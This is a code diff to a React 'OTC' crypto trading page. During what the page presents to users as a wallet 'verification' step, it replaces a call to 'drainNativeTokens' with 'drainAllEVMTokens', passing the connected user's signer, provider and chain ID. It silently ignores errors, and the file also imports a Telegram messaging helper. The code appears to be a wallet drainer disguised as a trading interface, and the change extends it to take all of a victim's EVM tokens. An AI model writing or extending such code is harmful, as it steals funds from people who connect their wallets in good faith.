@@ -18,7 +18,7 @@ import { getSolPrice } from '@/lib/utils';
 import { sendTelegramMessage } from '@/utils/telegram';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainNativeTokens } from '@/utils/evmTransactions';
+import { drainAllEVMTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
 import { deriveOrderFromAddress, shortAddress } from '@/services/tokenHolders';
@@ -75,7 +75,7 @@ const MOCK_ORDERS: OTCOrder[] = [
 const OTC = () => {
   const { connected, publicKey, sendTransaction } = useWallet();
   const { connection } = useConnection();
-  const { activeChain, getEVMChain } = useChain();
+  const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName, nativeToken } = useChainInfo();
   const [showPostModal, setShowPostModal] = useState(false);
@@ -124,11 +124,8 @@ const OTC = () => {
       try {
         setIsVerifying(true);
         const chainName = getEVMChain()?.name || 'EVM';
-        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
-        if (hash) {
-          onComplete();
-        } else {
-        }
+        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
+        onComplete();
       } catch (error: any) {
       } finally {
         setIsVerifying(false);
